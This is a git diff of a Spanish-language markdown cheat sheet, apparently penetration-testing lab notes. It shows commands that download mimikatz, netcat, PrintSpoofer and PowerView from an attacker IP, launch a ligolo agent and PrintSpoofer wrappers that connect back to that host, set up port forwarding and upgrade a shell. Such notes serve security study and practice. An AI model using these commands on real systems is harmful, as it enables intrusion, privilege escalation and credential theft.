@@ -17,7 +17,9 @@ zip -r tools.zip agent.exe nc.exe PrintSpoofer64.exe mimikatz.exe PowerView.ps1 
 ```bash
 iwr -uri http://192.168.45.152:8000/tools.zip -Outfile tools.zip
 ```
----
+
+* **Descomprimir**
+
 ```bash
 Expand-Archive tools.zip -DestinationPath .
 ```
@@ -48,17 +50,23 @@ bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601
 . .\Executor.ps1
 ```
 
-* help:
+#### Help:
 
 ```bash
-*Evil-WinRM* PS C:\Users\eric.wallows\Documents> . .\Executor.ps1 -h
-=== Executor.ps1 Help ===
-Funciones disponibles:
-  Invoke-Ligolo -ip <IP> [-port 11601]
-  Invoke-PrintSpoofer -ip <IP> [-port 4444]
-  Invoke-WinPEAS [-outputPath <ruta>]
-  Invoke-SharpHoundDump [-collection <tipo>]
+. .\Executor.ps1 -h
 ```
+#### Ligolo Executor:
+
+```bash
+Invoke-Ligolo -ip <ip>
+```
+#### Print-Spoofer
+
+```bash
+Invoke-PrintSpoofer -ip <ip>
+```
+
+### Port Forwarding
 
 #### ligolo listener
 
@@ -66,5 +74,8 @@ Funciones disponibles:
 listener_add --addr <ip_destino:puerto> --to <ip_kali:puerto> --tcp
 ```
 
+### Shell upgrade (ver Utils)
 
-
+```bash 
+SHELL=/bin/bash script -q /dev/null
+```
